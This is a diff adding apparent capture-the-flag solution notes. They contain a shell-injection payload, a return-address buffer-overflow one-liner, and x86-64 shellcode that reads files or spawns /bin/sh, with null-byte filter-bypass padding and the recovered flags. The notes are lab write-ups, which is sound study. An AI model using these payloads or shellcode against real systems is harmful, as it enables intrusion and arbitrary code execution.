@@ -1,0 +1,220 @@
+* cowshot1
+  it uses ~snprintf~ and ~system~
+  immediately think of shell injection.
+  try give it ~['$(cat flag|tee tmp)']~ (wrapped in single quotes such that bash doesn't just evaluate that. (use ~tee~ because all password will be transformed into caps)
+  flag is AINT_GONNA_BE_PART_OF_YOUR_system
+* cowshout2
+  exactly the same way
+  flag is $Money_can't_buy_Happiness
+* callme
+  buffer overflow. needs to overflow the return address to ~call_me~
+  stack will be like [128 byte buf][8 bytes pushed RBP][8 bytes return addr]
+  ~objdump -d callme | grep call_me~ gets the address of that function
+  ~python3 -c 'print("ghostbusters\x00"+" "*115+" "*8+"\x0d\x06\x40\x00\x00\x00\x00\x00")'|./callme~ to call the function
+  see in ~gdb~ that it suceeded in calling ~dash~. but it exits immediately
+  output above to a file and ~cat tmp -|./callme~ to access the shell
+  flag : buffers_dont_like_to_be_called_names
+* invitro1
+  =NOTE this can be done by using invitro2's method. First negate the address then negate it back to bypass filtering of /=
+  see program reads from a file containing (at most 128 bytes) shellcode and runs that code. Also shellcode cannot contain '/'. 
+  Found online shellcode that outputs file content as follows
+http://shell-storm.org/shellcode/files/shellcode-878.php
+  #+BEGIN_SRC c
+#include <stdio.h>
+#include <string.h>
+// Here we changed the last few bytes that correspond to /etc/passwd to flag and changed the 6th byte from \x0b to \x04 since we guess that is the length of the string. (look at above url)
+char code[] = "\xeb\x3f" // jmp +3f
+"\x5f"  // pop rdi
+"\x80\x77\x04\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05"
+"\xe8\xbc\xff\xff\xff" // call -xxx
+"\x66\x6c\x61\x67\x41" // flagA
+int main(){
+  //goto *(&code[0]);
+  FILE *f = fopen("shellcode","wb");
+  int i;
+  if (f == NULL) {
+    fprintf(stderr, "Error: couldn't open file for writing\n");
+    return 1;
+  }
+  fwrite(code,sizeof(char),strlen(code),f);
+  fclose(f);
+  return 0;
+}
+  #+END_SRC 
+  Proper way: write ASM
+  #+BEGIN_SRC asm
+global _start
+
+section .text
+
+_start:
+jmp _push_filename
+
+_readfile:
+; syscall open file
+pop rdi ; pop path value
+; NULL byte fix
+xor byte [rdi + 11], 0x41
+
+xor rax, rax
+add al, 2
+xor rsi, rsi ; set O_RDONLY flag
+syscall
+
+; syscall read file
+sub sp, 0xfff
+lea rsi, [rsp]
+mov rdi, rax
+xor rdx, rdx
+mov dx, 0xfff; size to read
+xor rax, rax
+syscall
+
+; syscall write to stdout
+xor rdi, rdi
+add dil, 1 ; set stdout fd = 1
+mov rdx, rax
+xor rax, rax
+add al, 1
+syscall
+
+; syscall exit
+xor rax, rax
+add al, 60
+syscall
+
+_push_filename:
+call _readfile
+path: db "/etc/passwdA"
+  #+END_SRC
+~nasm xxx -felf64 -o xxx.o~ to compile that assembly. ~(objdump -d shellcode.o | cut -f2 |sed -e '/[^0123456789abcdef ]/d'|tr '\n' ' ' | tr -s ' '|sed -e 's/\([0123456789abcdef]\{2\}\)/\\x\1/g'|sed 's/ //g')~ to turn into shellcodes
+flag: make_your_own_flag
+* invitro2
+  The wrongly written code adds one null byte every 8 bytes. need to jump over it.
+  from http://ref.x86asm.net/coder32.html#xEB, we see the opcode for ~jmp~ is ~eb~ and ~call~ is ~e8~ there are 63 instructions in between, exactly ~0x3f~! consider adding a ~jmp 1~ instruction everytime we expect a null byte. ~jmp 1~ takes two bytes. so every 6 bytes, we add a ~jmp 1~
+  The jump offsets needs to be manually tweaked as well. Also, no jumps inside string. All this is manual. Also, no jumps within an instruction. Just add NOP.
+  If we just add the NOP and JMPs to the last section, the length would exceed 128 bytes. BUT, they stop filtering for '/' anymore. which means we could just start ~/bin/sh~
+taken from 
+http://shell-storm.org/shellcode/files/shellcode-806.php
+  #+BEGIN_SRC asm
+main:
+    xor eax, eax
+    mov rbx, 0xFF978CD091969DD1 ; this is just some representation of /bin/sh
+    neg rbx
+    push rbx
+    ;mov rdi, rsp
+    push rsp
+    pop rdi
+    cdq
+    push rdx
+    push rdi
+    ;mov rsi, rsp
+    push rsp
+    pop rsi
+    mov al, 0x3b ;; system call number
+    syscall
+  #+END_SRC
+Notice that the ~mov~ is causing trouble since it is 7 bytes long. we need to split it so that we can add in the NOP and JMP. However, the sign extension is very very annoying. So we will resort to the original method.
+  #+BEGIN_SRC asm
+_start:
+    jmp _push_filename
+_main:
+  xor eax,eax
+  pop rdi
+  xor byte [rdi+7],0x41
+  xor rsi,rsi
+  xor rdx,rdx
+  mov al, 0x3b
+  syscall
+_push_filename: 
+  call _main
+  path:  db "/bin/shA"
+  #+END_SRC
+Now add the NOPs and JMPs. 
+  #+BEGIN_SRC asm
+_start:
+    jmp _push_filename
+_main:
+  xor eax,eax
+  pop rdi
+  nop
+  jmp short 2
+  add rdi,4 ;; because there will be 4 type offset from the place we call main to the start of string
+  nop
+  nop
+  jmp short 2
+  xor byte [rdi+7],0x41
+  nop
+  nop
+  jmp short 2
+  xor rsi,rsi
+  xor rdx,rdx
+  jmp short 2
+  mov al, 0x3b
+  syscall
+  nop
+  nop
+  jmp short 2
+_push_filename: 
+  call _main
+  nop
+  jmp short 2
+  path:  db "/bin/shA"
+  #+END_SRC 
+And add in nops in place for null byte to see the correct jmp offset
+  #+BEGIN_SRC asm
+_start:
+    jmp _push_filename
+_main:
+  xor eax,eax
+  pop rdi
+  nop
+  jmp short 2
+  nop
+  add rdi,4
+  nop
+  nop
+  jmp short 2
+  nop
+  xor byte [rdi+7],0x41
+  nop
+  nop
+  jmp short 2
+  nop
+  xor rsi,rsi
+  xor rdx,rdx
+  jmp short 2
+  nop
+  mov al, 0x3b
+  syscall
+  nop
+  nop
+  jmp short 2
+  nop
+_push_filename: 
+  call _main
+  nop
+  jmp short 2
+  nop
+  path:  db "/bin/shA"
+
+  #+END_SRC 
+  Using that to manually change the offset of first ~jmp~ and last ~call~ of the shellcode of the first one.
+  finally a helper program to test/write the shellcode
+  #+BEGIN_SRC c
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+char code[] = "\xeb\x2b\x31\xc0\x5f\x90\xeb\x01\x48\x83\xc7\x04\x90\x90\xeb\x01\x80\x77\x07\x41\x90\x90\xeb\x01\x48\x31\xf6\x48\x31\xd2\xeb\x01\xb0\x3b\x0f\x05\x90\x90\xeb\x01\xe8\xd0\xff\xff\xff\x90\xeb\x01\x2f\x62\x69\x6e\x2f\x73\x68\x41";
+
+int main(){
+  /* goto *(&code[0]); */
+  /* execve("/bin/sh",NULL,NULL); */
+  FILE *f = fopen("shellcode","wb");
+  fwrite(code,sizeof(char),strlen(code),f);
+  fclose(f);
+}
+  #+END_SRC
+flag: you_are_a_hopscotch_master
+* seashell
+  
